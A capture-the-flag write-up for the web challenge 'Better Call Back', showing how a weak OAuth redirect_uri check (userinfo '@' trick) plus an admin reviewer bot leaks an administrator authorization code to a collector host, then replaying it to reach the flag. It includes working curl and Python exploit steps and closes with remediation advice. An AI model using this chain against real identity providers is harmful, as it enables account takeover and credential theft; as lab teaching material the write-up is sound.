---
layout: writeup

title: Better Call Back
difficulty: Hard
points: 500
categories: [Web]
tags: [OAuth, SSO, Open Redirect, Redirect URI, Admin Bot]

flag: CYS{C4LLB4CKS_D0NT_PR0V3_1D3NT1TY}
---

# Better Call Back

**Author: KuantumKnight**

Better Call Back is a Web challenge based on an OAuth/SSO callback interception chain.

The goal is to access Madrigal Logistics' restricted regional shipment manifest at:

```text
/admin/manifest
```

The intended solution is not to forge an administrator session or crack a token. Instead, the challenge requires abusing a weak OAuth `redirect_uri` validation rule together with the portal's privileged reviewer channel to obtain a legitimate OAuth authorization code issued for the regional administrator.

## Reconnaissance

The main application is the Madrigal Logistics supplier portal.

Useful endpoints include:

```text
/                  Public operations board
/login             Starts the SSO login flow
/admin/manifest    Restricted administrator manifest
/legacy-admin      Deprecated administrator console
/report            Reviewer / trust-and-safety channel
/callback-receiver Redirects to the supplied callback collector
```

The homepage also exposes several useful hints:

```text
reviewer channel: standing by
Session: guest
Manifest: LOCKED
```

Checking `robots.txt` reveals the deprecated `/legacy-admin` endpoint, but the important attack surface is the SSO flow.

The identity provider is hosted separately and exposes:

```text
/login
/authorize
/token
/logout
```

The login page provides demo credentials:

```text
Username: employee
Password: employee
```

## Understanding the Normal OAuth Flow

A normal login looks like this:

```text
User
  |
  v
Portal /login
  |
  | generates state
  v
IDP /authorize
  |
  | authenticates user
  | creates signed authorization code
  v
Portal /callback?code=...&state=...
  |
  | validates state
  | exchanges code at /token
  v
Authenticated portal session
```

For the demo employee account, the authorization code represents:

```json
{
  "client_id": "supplier-portal",
  "user": "employee",
  "role": "user"
}
```

The portal then creates a session similar to:

```json
{
  "user": "employee",
  "role": "user"
}
```

This is not enough to access `/admin/manifest`.

## Vulnerability 1 — Weak `redirect_uri` Validation

The identity provider validates the OAuth `redirect_uri`, but the check is not strict enough.

The expected callback is:

```text
https://portal-rouge-delta.vercel.app/callback
```

However, a URL using the `@` userinfo syntax is also accepted:

```text
https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=MAILBOX_ID
```

This is significant because URL parsers interpret:

```text
https://user@host/path
```

as:

```text
userinfo = user
host     = host
```

Therefore, in the malicious URL:

```text
https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/...
```

the real destination host is:

```text
collector-hazel-five.vercel.app
```

The string `portal-rouge-delta.vercel.app` is only the userinfo portion.

The identity provider's validation sees the trusted portal hostname inside the supplied URL and accepts it, but the OAuth code is actually delivered to the collector.

A basic proof can be performed after logging into the IDP:

```bash
curl -c cookies.txt -X POST \
  https://idp-psi.vercel.app/login \
  -d "username=employee&password=employee"
```

Then request authorization using the crafted redirect:

```bash
curl -b cookies.txt -D - \
  "https://idp-psi.vercel.app/authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=TESTBOX&state=test"
```

The IDP responds with a redirect similar to:

```text
Location: https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=TESTBOX&code=...&state=test
```

The actual HTTP destination is the collector.

## Vulnerability 2 — Privileged Reviewer Channel

The portal contains a report endpoint:

```text
/report
```

It is presented as a trust-and-safety or reviewer channel for malformed SSO URLs.

The important behavior is that submitted links are inspected by an authenticated regional reviewer.

That reviewer is logged into the identity provider as:

```text
user: regional.admin
role: admin
```

This means that if the reviewer visits an OAuth authorization URL containing the vulnerable `redirect_uri`, the IDP generates a legitimate authorization code for the administrator and redirects that code to the attacker's callback mailbox.

The reviewer therefore becomes the privileged browser required to complete the exploit chain.

## Exploitation

### Step 1 — Create a Callback Mailbox

The supplied collector can create temporary callback mailboxes.

```bash
curl "https://collector-hazel-five.vercel.app/new?view=1"
```

Example mailbox:

```text
eff745a493b3633b
```

Its callback endpoint is:

```text
https://collector-hazel-five.vercel.app/collect?box=eff745a493b3633b
```

### Step 2 — Build the Malicious Authorization URL

Use the userinfo-based `redirect_uri` bypass:

```text
https://idp-psi.vercel.app/authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=eff745a493b3633b&state=success_test
```

Although the URL contains the legitimate portal hostname, the actual callback destination is the collector.

### Step 3 — Send the URL to the Reviewer

Submit the crafted URL through `/report`:

```bash
curl -X POST \
  https://portal-rouge-delta.vercel.app/report \
  --data-urlencode "url=https://idp-psi.vercel.app/authorize?client_id=supplier-portal&redirect_uri=https://portal-rouge-delta.vercel.app@collector-hazel-five.vercel.app/collect?box=eff745a493b3633b&state=success_test"
```

The application responds that an authenticated regional reviewer inspected the link.

### Step 4 — Read the Captured Callback

Query the callback mailbox:

```bash
curl \
  https://collector-hazel-five.vercel.app/mailbox/eff745a493b3633b
```

A successful exploit returns something similar to:

```json
[
  {
    "code": "eyJjbGllbnRfaWQiOiJzdXBwbGllci1wb3J0YWwiLCJ1c2VyIjoicmVnaW9uYWwuYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.apW1ng.bBxnFPstrdQAnkM4BH_FjaH3Uxw",
    "state": "success_test"
  }
]
```

Decoding the authorization code payload shows:

```json
{
  "client_id": "supplier-portal",
  "user": "regional.admin",
  "role": "admin"
}
```

The code is genuine and correctly signed by the identity provider.

The weakness is not token forgery.

The weakness is that a valid administrator code was delivered to an attacker-controlled callback.

### Step 5 — Obtain a Valid Portal OAuth State

The portal still validates the OAuth `state` value during `/callback`.

Create a fresh portal session and begin a normal login:

```python
import requests

session = requests.Session()

resp = session.get(
    "https://portal-rouge-delta.vercel.app/login",
    allow_redirects=False
)

state = resp.headers["Location"].split("state=")[1]
```

The session now contains the matching OAuth state.

### Step 6 — Replay the Captured Admin Code

Use the stolen administrator authorization code with the fresh valid portal state:

```python
admin_code = "CAPTURED_ADMIN_CODE"

session.get(
    "https://portal-rouge-delta.vercel.app/callback",
    params={
        "code": admin_code,
        "state": state
    }
)
```

The portal exchanges the code with the IDP and creates:

```json
{
  "user": "regional.admin",
  "role": "admin"
}
```

### Step 7 — Access the Restricted Manifest

The administrator-only endpoint can now be requested:

```python
resp = session.get(
    "https://portal-rouge-delta.vercel.app/admin/manifest"
)

print(resp.text)
```

The manifest is returned successfully and contains the flag.

## Flag

```text
CYS{C4LLB4CKS_D0NT_PR0V3_1D3NT1TY}
```

## Root Cause

The challenge is built around a three-part authentication failure.

### 1. Improper OAuth Redirect URI Validation

The IDP does not compare the callback against an exact allowlisted URI.

Instead, its validation can be bypassed using URL userinfo syntax:

```text
trusted-host@attacker-host
```

This allows an authorization code to leave the trusted origin.

### 2. Privileged Reviewer as an OAuth Oracle

The `/report` functionality causes a privileged, authenticated reviewer to visit attacker-controlled authorization URLs.

Because the reviewer already possesses an administrator IDP session, the attacker can cause the IDP to generate an administrator OAuth code.

### 3. Authorization Code Possession Is Treated as Authentication

The portal correctly verifies the signed code through the token endpoint, but it has no way to distinguish between:

```text
a code legitimately delivered to the portal
```

and:

```text
a legitimate code intercepted through a malicious redirect
```

The authorization code is cryptographically valid, but the delivery path is compromised.

## Intended Vulnerability Chain

```text
Weak redirect_uri validation
        |
        v
Attacker-controlled callback
        |
        v
Privileged reviewer visits OAuth URL
        |
        v
IDP issues legitimate admin code
        |
        v
Admin code captured by attacker
        |
        v
Fresh portal OAuth state obtained
        |
        v
Captured code replayed to /callback
        |
        v
Portal creates admin session
        |
        v
/admin/manifest
        |
        v
FLAG
```

## Security Takeaways

The main lesson of the challenge is reflected in the flag:

```text
CALLBACKS DON'T PROVE IDENTITY
```

OAuth authorization codes must only be delivered to strictly registered callback URIs.

A secure implementation should:

- perform exact redirect URI matching against a server-side allowlist;
- reject URLs containing unexpected userinfo components;
- avoid substring or prefix-based hostname validation;
- treat privileged link-review systems as security-sensitive browser automation;
- bind authorization requests as tightly as possible to the initiating client;
- use PKCE where applicable so interception of an authorization code alone is insufficient.

Signed tokens protect against forgery.

They do not protect against a valid token or authorization code being delivered to the wrong party.
